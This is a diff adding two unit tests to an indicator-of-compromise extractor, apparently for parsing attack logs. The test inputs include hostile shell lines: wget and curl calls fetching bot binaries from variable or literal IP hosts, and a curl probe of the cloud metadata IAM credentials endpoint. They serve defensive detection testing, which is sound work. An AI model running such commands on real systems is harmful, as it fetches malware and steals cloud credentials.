@@ -105,3 +105,15 @@ test('degenerate input never throws', () => {
     assert.deepStrictEqual(extractIocs(c), []);
   }
 });
+
+test('a URL whose host is an unexpanded shell variable is not an indicator', () => {
+  // Production listed "$server_ip" and "${host}" as payload servers.
+  const urls = (c) => extractIocs(c).filter((i) => i.type === 'url').map((i) => i.value);
+  assert.deepStrictEqual(urls('wget http://$SERVER_IP/p.txt; curl http://${HOST}/${BIN_DIR}/x'), []);
+  assert.deepStrictEqual(urls('wget http://176.65.139.89/bot_${arch}'), ['http://176.65.139.89/bot_${arch}']);
+});
+
+test('the cloud metadata service is a credential probe, not a payload host', () => {
+  const c = 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/';
+  assert.deepStrictEqual(extractIocs(c).filter((i) => i.type === 'url'), []);
+});
